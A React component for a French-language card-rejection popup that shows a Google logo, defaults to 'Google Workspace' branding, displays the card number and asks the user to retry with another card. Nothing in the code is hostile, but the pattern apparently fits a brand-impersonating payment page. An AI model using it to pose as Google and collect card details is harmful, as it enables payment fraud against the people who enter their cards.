import React from 'react';
import { createPortal } from 'react-dom';
import PopupHeader from '../common/PopupHeader';
import styles from '../../styles/components/CommonPopup.module.css';

const CardVerificationErrorPopup = ({ 
  isVisible, 
  cardLogo, 
  onChangeCard,
  isLoading,
  cardNumber,
  brandName = "Google Workspace" 
}) => {
  if (!isVisible) return null;

  const popupContent = (
    <div className={styles.popupWrapper}>
      <div className={`${styles.popup} ${styles.errorPopup}`}>
        <PopupHeader 
          showGoogleLogo={true} 
          showCardLogo={true}
          cardNumber={cardNumber}
        />
        
        <div className={styles.errorContent}>
          <div className={styles.errorIconContainer}>
            <span className={styles.errorIcon}>❌</span>
          </div>
          
          <h2 className={styles.errorTitle}>Carte non-prise en charge</h2>
          
          <p className={styles.errorDescription}>
            Échec durant la vérification d'identité : mode de paiement non-accepté.
          </p>
          
          <div className={styles.errorNotice}>
            <p className={styles.errorNoticeText}>
              Dans le cadre de la lutte contre la fraude, nous avons mis en place un système 
              de vérification d'identité pour nos paiements en ligne. 
              Assurez-vous d'utiliser une carte bancaire valide à votre nom.
            </p>
          </div>
          
          <button 
            onClick={onChangeCard} 
            disabled={isLoading}
            className={styles.retryButton}
          >
            Réessayer
          </button>
        </div>
      </div>
    </div>
  );

  // Utiliser createPortal pour rendre le popup à la racine du document
  return typeof window !== 'undefined' 
    ? createPortal(popupContent, document.body)
    : null;
};

export default CardVerificationErrorPopup;
